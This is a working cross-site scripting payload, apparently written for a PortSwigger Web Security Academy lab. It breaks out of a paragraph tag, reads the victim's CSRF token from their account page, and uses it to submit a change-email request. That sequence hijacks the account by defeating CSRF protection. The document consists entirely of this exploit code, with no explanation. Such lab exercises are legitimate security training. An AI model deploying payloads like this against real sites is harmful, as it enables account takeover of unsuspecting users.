</p><script>
function getCSRFToken(){
    var xhr = new XMLHttpRequest();
    var re = new RegExp('name="csrf" value="(.*)">');
    xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
                var csrfToken = xhr.responseText.match(re)[1];
                console.log(csrfToken)
                changeMail(csrfToken);
        }
    }
    xhr.open('GET', 'https://acff1f591f86d8fa80b013b7005200ee.web-security-academy.net/my-account', true);
    xhr.send(null);
}

function changeMail(csrfToken){
    var http = new XMLHttpRequest();
    var params = 'email=newmail@mail.com&csrf='+csrfToken;
    http.open('POST', 'https://acff1f591f86d8fa80b013b7005200ee.web-security-academy.net/my-account/change-email', true);
    
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.send(params);
}

var csrfToken = getCSRFToken();
</script>